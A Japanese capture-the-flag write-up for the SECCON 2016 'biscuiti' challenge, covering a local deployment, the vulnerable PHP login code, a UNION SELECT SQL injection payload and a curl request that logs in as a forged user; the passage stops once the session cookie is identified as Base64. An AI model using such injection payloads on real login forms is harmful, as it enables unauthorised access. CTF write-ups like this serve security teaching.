# biscuiti [Web, Crypto / 300pt]

## Problem
biscuiti

Can you login as admin?

[http://biscuiti.pwn.seccon.jp/](http://biscuiti.pwn.seccon.jp/)

[biscuiti.zip](https://github.com/AkashiSN/SECCON2016-Online-CTF/blob/master/Crypto/biscuiti/biscuiti.zip)

Note: You should estimate that exploits cost an hour.

## Answer

### 環境構築

[SECCON2016_online_CTF - GitHub](https://github.com/SECCON/SECCON2016_online_CTF/tree/master/Crypto/300_biscuiti)の

`build/README.md`にあるようにデプロイしてみる

```bash
cd build/deploy
vagrant up
sudo gem install itamae
itamae ssh --vagrant roles/main.rb
```

これで[http://localhost:10080](http://localhost:10080)で問題がホストされるようになった

### 問題を解く

![img](img.png)

問題ファイルの[index.php](https://github.com/AkashiSN/SECCON2016-Online-CTF/blob/master/Crypto/biscuiti/biscuiti/index.php)の認証部を見てみると

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    $dbh = new PDO('sqlite:../db/users.db');
    $result = $dbh->query("SELECT username, enc_password from user WHERE username='{$username}'");
    if (!$result) {
        login_page("error");
        /* DEBUG 
        $info = $dbh->errorInfo();
        login_page($info[2]);
        //*/
    }
    $u = $result->fetch(PDO::FETCH_ASSOC);
    if ($u && auth($u["enc_password"], $password)) {
        $SESSION["name"] = $u['username'];
        $SESSION["isadmin"] = $u['isadmin'];
        save_session();
        info_page();
    }
    else {
        login_page("error");
    }
}
else {
    load_session();
    if (isset($SESSION["name"])) {
        info_page();
    }
    else {
        login_page();
    }
}
```

となっていて、SQLインジェクションができそう

```sql
SELECT username, enc_password from user WHERE username='{$username}'
```

ここに、

```sql
'UNION SELECT 'hogehoge','hoge
```

を送り込んでやると

```sql
SELECT username, enc_password from user WHERE username=''UNION SELECT 'hogehoge','hoge'
```

という文が完成して、

```plain
+----------+------+
| hogehoge | hoge |
+----------+------+
```
というのが返ってくる。

```plain
$ curl -i -F "username='UNION SELECT 'hogehoge','hoge" -F "password=" http://localhost:10080
HTTP/1.1 100 Continue

HTTP/1.1 200 OK
Date: Fri, 17 Nov 2017 02:15:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: JSESSION=YToyOntzOjQ6Im5hbWUiO3M6ODoiaG9nZWhvZ2UiO3M6NzoiaXNhZG1pbiI7Tjt97kVYluAhjodZrAPgRb3AZg%3D%3D
Vary: Accept-Encoding
Content-Length: 139
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html>
<head><title>Login</title></head>
<body>
Hello hogehoge
<div><a href="logout.php">Log out</a></div>
</body>
</html>
```

`hogehoge`としてログインできる

`%3D`は`=`なので、

```plain
JSESSION=YToyOntzOjQ6Im5hbWUiO3M6ODoiaG9nZWhvZ2UiO3M6NzoiaXNhZG1pbiI7Tjt97kVYluAhjodZrAPgRb3AZg==
```

これはBase64っぽい

